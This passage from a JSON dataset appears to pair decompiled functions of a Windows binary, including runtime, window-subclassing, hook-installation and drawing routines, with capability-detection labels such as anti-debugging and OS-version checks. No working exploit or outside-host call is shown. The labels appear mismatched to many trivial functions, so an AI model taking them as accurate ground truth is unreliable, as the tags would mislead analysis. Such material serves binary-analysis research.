            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0040e310(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    *(unaff_ESI + -4) = *(unaff_EBP + -0x28);\n    iVar1 = fcn.0040e693();\n    *(iVar1 + 0x6c) = *(unaff_EBP + -0x1c);\n    iVar1 = fcn.0040e693();\n    *(iVar1 + 0x70) = *(unaff_EBP + -0x20);\n    if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) && (unaff_EDI[5] == 0x19930520)) &&\n       ((*(unaff_EBP + -0x24) == 0 && (*(unaff_EBP + -0x2c) != 0)))) {\n        fcn.0040b28a();\n        fcn.0040e54c();\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "0040f091": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f091(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_1a4h;\n    uint var_a0h;\n    \n    iVar2 = 0;\n    piVar1 = 0x44a6b8;\n    do {\n        if (arg_8h == *piVar1) break;\n        piVar1 = piVar1 + 2;\n        iVar2 = iVar2 + 1;\n    } while (piVar1 < 0x44a748);\n    if (arg_8h == *(iVar2 * 8 + 0x44a6b8)) {\n        if ((*0x44d7e4 == 1) || ((*0x44d7e4 == 0 && (*0x44a1d4 == 1)))) {\n            fcn.0040f370();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (arg_8h != 0xfc) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.0040f280();\n            }\n            iVar2 = fcn.0040f370();\n            if (0x3c < iVar2 + 1U) {\n                fcn.0040f370();\n                fcn.004113a0();\n            }\n            fcn.0040f280();\n            fcn.0040f290();\n            fcn.0040f290();\n            fcn.0040f290();\n            fcn.00411309(&var_a0h, \"Microsoft Visual C++ Runtime Library\");\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "0040f3eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0040f3eb(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t arg_8h;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 * param_2;\n    uVar1 = arg_8h;\n    if (arg_8h < 0xffffffe1) {\n        if (arg_8h == 0) {\n            uVar1 = 1;\n        }\n        uVar1 = uVar1 + 0xf & 0xfffffff0;\n    }\n    do {\n        iVar2 = 0;\n        if (uVar1 < 0xffffffe1) {\n            if (arg_8h < *0x44a5f4 || arg_8h - *0x44a5f4 == 0) {\n                fcn.0040d20a(9);\n                iVar2 = fcn.0040d614(arg_8h);\n                fcn.0040d26b(9);\n                if (iVar2 != 0) {\n                    fcn.0040b990(iVar2, 0, arg_8h);\n                    return iVar2;\n                }\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44f15c, 8, uVar1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        if (*0x44d874 == 0) {\n            return iVar2;\n        }\n        iVar2 = fcn.0040d18a(uVar1);\n    } while (iVar2 != 0);\n    return 0;\n}\n",
        "token_count": 373
    },
    "004162e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004162e1(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::ios_base.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) || (pcVar1 = pcVar1 + 0x44dfb4,  *pcVar1 = *pcVar1 + -1,  extraout_ECX[9][0x44dfb4] < '\\x01'))\n    {\n        fcn.004163f5();\n    }\n    fcn.00414580();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 252
    },
    "0041472a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041472a(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    cVar1 = *(extraout_ECX + 0x12);\n    *(unaff_EBP + -4) = 1;\n    if (cVar1 != '\\0') {\n        fcn.00414cdb();\n    }\n    pcVar2 = extraout_ECX[0x11];\n    if (pcVar2 != NULL) {\n        fcn.004024b0(1);\n        fcn.0041bd2d(pcVar2);\n    }\n    fcn.00414580();\n    *extraout_ECX = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    fcn.00414580();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 331
    },
    "00414c31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00414c31(int32_t param_1, uint param_2)\n\n{\n    char unaff_retaddr;\n    \n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x28) = param_2;\n    *(param_1 + 0x30) = 0x20;\n    fcn.004163bd();\n    if (*(param_1 + 0x28) == 0) {\n        fcn.00416080(*(param_1 + 4) & 0xffffff00 | *(param_1 + 4) & 0xff | 4 | 4, 0);\n    }\n    if (unaff_retaddr != '\\0') {\n        fcn.0041636f();\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "0041552e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041552e(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    cVar1 = *(extraout_ECX + 0x12);\n    *(unaff_EBP + -4) = 1;\n    if (cVar1 != '\\0') {\n        fcn.00415b78();\n    }\n    pcVar2 = extraout_ECX[0x11];\n    if (pcVar2 != NULL) {\n        fcn.004024b0(1);\n        fcn.0041bd2d(pcVar2);\n    }\n    fcn.00414580();\n    *extraout_ECX = vtable.std::basic_streambuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    fcn.00414580();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 340
    },
    "00415ad5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415ad5(int32_t param_1, uint param_2)\n\n{\n    ushort uVar1;\n    char unaff_retaddr;\n    \n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x28) = param_2;\n    uVar1 = fcn.0041685e(0x20);\n    *(param_1 + 0x30) = uVar1;\n    fcn.004163bd();\n    if (*(param_1 + 0x28) == 0) {\n        fcn.00416080(*(param_1 + 4) & 0xffffff00 | *(param_1 + 4) & 0xff | 4 | 4, 0);\n    }\n    if (unaff_retaddr != '\\0') {\n        fcn.0041636f();\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00416910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00416910(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetPropA;\n    uStack28 = *0x44f3e8;\n    uStack32 = param_1;\n    uStack36 = 0x41692b;\n    iVar2 = (*_sym.imp.USER32.dll_GetPropA)();\n    if (iVar2 == 0) {\n        uStack36 = *0x44f3ee;\n        uStack40 = param_1;\n        uStack44 = 0x41693f;\n        iVar2 = (*pcVar1)();\n        if (iVar2 == 0) {\n            uStack44 = *0x44f3f2;\n            uStack48 = param_1;\n            uStack52 = 0x416953;\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) {\n                uStack52 = *0x44f3ec;\n                uStack56 = param_1;\n                uStack60 = 0x416967;\n                iVar2 = (*pcVar1)();\n                if (iVar2 == 0) {\n                    uStack60 = *0x44f3f0;\n                    uStack64 = param_1;\n                    uStack68 = 0x41697b;\n                    iVar2 = (*pcVar1)();\n                    if (iVar2 == 0) {\n                        uStack68 = *0x44f3ea;\n                        uStack72 = param_1;\n                        uStack76 = 0x41698b;\n                        iVar2 = (*pcVar1)();\n                        if (iVar2 == 0) {\n                            uStack76 = param_1;\n                            iVar2 = fcn.004168a0();\n                            if (iVar2 == 0) {\n                                if (*0x44fee5 != '\\0') {\n                                    uStack76 = param_1;\n                                    iVar2 = (*_sym.imp.USER32.dll_IsWindowUnicode)();\n                                    if (iVar2 == 0) {\n                                        uStack76 = 0x10;\n                                        (*_sym.imp.USER32.dll_GetClassNameA)(param_1, &stack0xffffffc0);\n                                        (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&stack0xffffffb4, \"edit\");\n                                    }\n                                }\n                                uStack76 = uStack40;\n                                uVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(param_1, 0xfffffffc);\n                                (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x44f3ee, uVar3);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 685
    },
    "00416dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00416dc0(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint unaff_retaddr;\n    uchar *puVar5;\n    uchar auStack264 [4];\n    uchar auStack260 [4];\n    char acStack256 [248];\n    char **ppcStack8;\n    int32_t *piStack4;\n    \n    pcVar2 = _sym.imp.USER32.dll_CharNextA;\n    pcVar4 = acStack256;\n    cVar1 = *param_2;\n    while (cVar1 != '\\0') {\n        cVar1 = *param_2;\n        if (cVar1 == '&') {\n            param_2 = param_2 + 1;\n            if (*param_2 == '\\0') break;\ncode_r0x00416e17:\n            cVar1 = *param_2;\n            param_2 = param_2 + 1;\n            *pcVar4 = cVar1;\n            pcVar4 = pcVar4 + 1;\n        }\n        else {\n            if (*0x44fee5 == '\\0') goto code_r0x00416e17;\n            if (cVar1 == *0x44fee4) {\n                param_2 = param_2 + 1;\n                if (*param_2 != '\\0') goto code_r0x00416e17;\n                break;\n            }\n            if ((cVar1 != '\\x1e') && (cVar1 != '\\x1f')) goto code_r0x00416e17;\n            if (param_2[1] == '\\0') break;\n            param_2 = (*pcVar2)(param_2 + 1);\n        }\n        cVar1 = *param_2;\n    }\n    puVar5 = auStack264;\n    *pcVar4 = '\\0';\n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    (*_sym.imp.GDI32.dll_GetTextExtentPointA)(unaff_retaddr, auStack260, uVar3);\n    *ppcStack8 = acStack256;\n    *piStack4 = puVar5;\n    return;\n}\n",
        "token_count": 491
    },
    "00416fb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00416fb0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint unaff_retaddr;\n    \n    if (*0x44f400 < 0x30a) {\n        return 0;\n    }\n    if (*0x44f3e0 == 0) {\n        return 0;\n    }\n    uVar4 = param_2 | 1;\n    if ((param_2 & 2) != 0) {\n        uVar4 = param_2 & 0xfffffffc;\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x44f3c0);\n    if (*0x44f43c != 0x80) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        iVar2 = 0;\n        if (0 < *0x44f43c) {\n            piVar3 = 0x44f444;\n            do {\n                if (*piVar3 == iVar1) {\n                    piVar3 = iVar2 * 0x14 + 0x44f44c;\n                    *piVar3 = *piVar3 + 1;\n                    goto code_r0x004170b6;\n                }\n                piVar3 = piVar3 + 5;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < *0x44f43c);\n        }\n        iVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, 0x418110, *0x44f3fc, iVar1);\n        if (iVar2 != 0) {\n            *(*0x44f43c * 0x14 + 0x44f440) = unaff_retaddr;\n            *(*0x44f43c * 0x14 + 0x44f444) = iVar1;\n            *(*0x44f43c * 0x14 + 0x44f448) = iVar2;\n            *(*0x44f43c * 0x14 + 0x44f44c) = 1;\n            *(*0x44f43c * 0x14 + 0x44f450) = uVar4;\n            *0x44f438 = *0x44f43c;\n            *0x44f43c = *0x44f43c + 1;\n            *0x44f434 = iVar1;\ncode_r0x004170b6:\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n    return 0;\n}\n",
        "token_count": 623
    },
    "004171f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004171f0(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    \n    if (*0x44f3e0 != 0) {\n        iVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffffc);\n        pcVar3 = _sym.imp.USER32.dll_SetWindowLongA;\n        pcVar2 = _sym.imp.USER32.dll_RemovePropA;\n        iVar6 = 0;\n        do {\n            if (*(iVar6 * 0x18 + 0x44fe40) == iVar4) {\n                uVar5 = fcn.004168c0(param_1, iVar6);\n                (*pcVar2)(param_1, *0x44f3ee);\n                (*pcVar3)(param_1, 0xfffffffc, uVar5);\n                iVar4 = 0;\n                iVar6 = 0x10;\n            }\n            pcVar1 = _sym.imp.USER32.dll_GetPropA;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 6);\n        if (iVar6 == 6) {\n            if (iVar4 == 0x417da0) {\n                uVar5 = fcn.004168c0(param_1, 6);\n                (*pcVar2)(param_1, *0x44f3ee);\n                (*pcVar3)(param_1, 0xfffffffc, uVar5);\n            }\n            else {\n                iVar4 = (*_sym.imp.USER32.dll_GetPropA)(param_1, *0x44f3ee);\n                if (((iVar4 != 0) || (iVar4 = (*pcVar1)(param_1, *0x44f3f2),  iVar4 != 0)) ||\n                   (iVar4 = (*pcVar1)(param_1, *0x44f3f0),  iVar4 != 0)) {\n                    (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x44f3f4, 1);\n                }\n            }\n        }\n        pcVar2 = _sym.imp.USER32.dll_GetWindow;\n        for (iVar4 = (*_sym.imp.USER32.dll_GetWindow)(param_1, 5); iVar4 != 0; iVar4 = (*pcVar2)(iVar4, 2)) {\n            fcn.004171f0(iVar4);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 572
    },
    "00417440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00417440(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_ESI;\n    uint32_t uVar4;\n    uint16_t unaff_retaddr;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (*0x44f3e0 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(param_1, 5);\n        if (iVar2 != 0) {\n            uVar4 = unaff_ESI & 0xffff0000 | unaff_retaddr;\n            do {\n                fcn.00417390(iVar2, uVar4, 0);\n                for (iVar3 = (*pcVar1)(iVar2, 5); iVar3 != 0; iVar3 = (*pcVar1)(iVar3, 2)) {\n                    fcn.00417390(iVar3, uVar4, iVar2);\n                }\n                iVar2 = (*pcVar1)(iVar2, 2);\n            } while (iVar2 != 0);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "00417530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00417530(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (((*0x44f3e0 == 0) || (param_1 < 0x134)) || (param_1 == 0x137)) {\n        return 0;\n    }\n    if (param_1 == 0x134) {\n        if (*0x44f400 < 0x35f) {\n            iVar2 = (*_sym.imp.USER32.dll_GetWindow)(param_3, 5);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_3, 0xfffffff0);\n                if ((uVar1 & 3) != 3) goto code_r0x00417584;\n            }\n        }\n        return 0;\n    }\ncode_r0x00417584:\n    (*_sym.imp.GDI32.dll_SetTextColor)(param_2, *0x44f410);\n    (*_sym.imp.GDI32.dll_SetBkColor)(param_2, *0x44f408);\n    return *0x44f428;\n}\n",
        "token_count": 274
    },
    "004175f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * fcn.004175f0(int32_t param_1, uint param_2, uchar *param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    int32_t iStack136;\n    uchar *puStack132;\n    int32_t iStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    uchar *puStack116;\n    int32_t iStack112;\n    uchar *puStack108;\n    uchar *puStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    \n    if (param_5 == 0) {\n        puStack80 = 0x6;\n        puStack84 = param_1;\n        uStack88 = 0x417612;\n        iStack96 = fcn.004168c0();\n    }\n    else {\n        iStack96 = 0;\n    }\n    puStack80 = param_4;\n    if (iStack96 == 0) {\n        puStack84 = param_3;\n        uStack88 = param_2;\n        iStack92 = param_1;\n        iStack96 = 0x417643;\n        puStack80 = (*_sym.imp.USER32.dll_DefWindowProcA)();\n    }\n    else {\n        puStack84 = param_3;\n        uStack88 = param_2;\n        iStack92 = param_1;\n        iStack100 = 0x417630;\n        puStack80 = (*_sym.imp.USER32.dll_CallWindowProcA)();\n    }\n    if (*0x44f3e0 == 0) {\n        return puStack80;\n    }\n    iStack100 = param_1;\n    puStack104 = 0x417665;\n    iVar1 = (*_sym.imp.USER32.dll_IsIconic)();\n    if (iVar1 != 0) {\n        return puStack84;\n    }\n    puStack80 = 0x1;\n    puStack104 = &stack0xffffffb0;\n    puStack108 = NULL;\n    iStack112 = 0x11ef;\n    puStack116 = param_1;\n    iStack120 = 0x417692;\n    (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack120 = 0xfffffff0;\n    puStack124 = param_1;\n    iStack128 = 0x41769d;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((puStack104 != NULL) && ((uVar2 & 0x10400080) == 0x10400080)) {\n        bVar5 = (uVar2 & 0xc00000) == 0xc00000;\n        iStack128 = param_1;\n        iVar4 = *0x44fed8 - bVar5;\n        puStack132 = 0x4176e2;\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowDC)();\n        puStack132 = &stack0xffffff9c;\n        iStack136 = param_1;\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        iStack100 = iStack100 - puStack108;\n        iStack96 = iStack96 - puStack104;\n        puStack104 = NULL;\n        puStack108 = NULL;\n        fcn.00416bd0(uVar3, &stack0xffffff94, 2, 7, 0xf);\n        puVar8 = &stack0xffffff94;\n        iVar9 = -1;\n        (*_sym.imp.USER32.dll_InflateRect)(puVar8, 0xffffffff, 0xffffffff);\n        fcn.00416bd0(uVar3, &stack0xffffff88, 0, 2, 0xf);\n        iVar7 = -1;\n        uVar6 = 0xffffffff;\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xffffff88, 0xffffffff, 0xffffffff);\n        iVar1 = (*_sym.imp.GDI32.dll_SelectObject)(uVar3, *0x44f428);\n        iStack120 = iStack136;\n        iStack112 = iStack128;\n        puStack116 = iVar9 + *0x44fed4;\n        puStack124 = iVar9;\n        fcn.00416ba0(uVar3, &stack0xffffff84);\n        (*_sym.imp.USER32.dll_OffsetRect)(&stack0xffffff84, puStack132 + (-*0x44fed4 - iVar9), 0);\n        fcn.00416ba0(uVar3, &stack0xffffff78);\n        iStack136 = iVar7 + *0x44fed4;\n        iStack128 = iVar1 - *0x44fed4;\n        puStack124 = puStack132 + iVar4;\n        fcn.00416ba0(uVar3, &stack0xffffff78);\n        if (bVar5) {\n            puStack116 = puStack132 + iVar4;\n            iStack120 = iStack136;\n            iStack112 = iStack128;\n            puStack108 = puStack116 + *0x44fedc;\n            fcn.00416bd0(uVar3, &stack0xffffff88, 2, 0, 0xf);\n        }\n        puStack132 = puStack132 + ((iVar9 - puVar8) - *0x44fed4);\n        puStack124 = puStack132 + *0x44fed8;\n        fcn.00416ba0(uVar3, &stack0xffffff78);\n        (*_sym.imp.GDI32.dll_SelectObject)(uVar3, uVar6);\n        (*_sym.imp.USER32.dll_ReleaseDC)(param_1, uVar3);\n    }\n    return puStack108;\n}\n",
        "token_count": 1326
    },
    "004178a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004178a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    char *pcStack48;\n    char *pcStack44;\n    char *pcStack40;\n    char *pcStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (*0x44fee5 != '\\0') {\n        uStack24 = 0x44f3c0;\n        uStack28 = 0x4178bd;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProfileStringA;\n        puStack32 = &stack0xfffffff0;\n        uStack28 = 9;\n        *0x44fee4 = 0x1e;\n        pcStack36 = \"roman\";\n        pcStack40 = \"kanjimenu\";\n        pcStack44 = \"windows\";\n        pcStack48 = 0x4178e2;\n        (*_sym.imp.KERNEL32.dll_GetProfileStringA)();\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiA;\n        puStack52 = &stack0xffffffdc;\n        pcStack48 = \"kanji\";\n        uStack56 = 0x4178f4;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)();\n        if (iVar3 == 0) {\n            *0x44fee4 = 0x1f;\n        }\n        puStack60 = &stack0xffffffd4;\n        uStack56 = 9;\n        pcStack64 = \"english\";\n        (*pcVar1)(\"windows\", \"hangeulmenu\");\n        iVar3 = (*pcVar2)(&stack0xffffffc0, \"hangeul\");\n        if (iVar3 == 0) {\n            *0x44fee4 = 0x1f;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "00417940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00417940(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    \n    uStack56 = 0x44f3c0;\n    uStack60 = 0x417951;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uStack60 = 0;\n    uStack64 = 0x417959;\n    uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n    pcVar2 = _sym.imp.GDI32.dll_GetDeviceCaps;\n    uStack64 = 0xc;\n    uStack72 = 0x417966;\n    uStack68 = uVar4;\n    iVar5 = (*_sym.imp.GDI32.dll_GetDeviceCaps)();\n    uStack72 = 0xe;\n    uStack76 = uVar4;\n    iVar6 = (*pcVar2)();\n    pcVar2 = _sym.imp.USER32.dll_GetSystemMetrics;\n    *0x44f3e0 = 3 < iVar5 * iVar6;\n    iVar5 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1);\n    if ((iVar5 == 0x15e) && (iVar5 = (*pcVar2)(0),  iVar5 == 0x280)) {\n        *0x44f3e0 = 0;\n    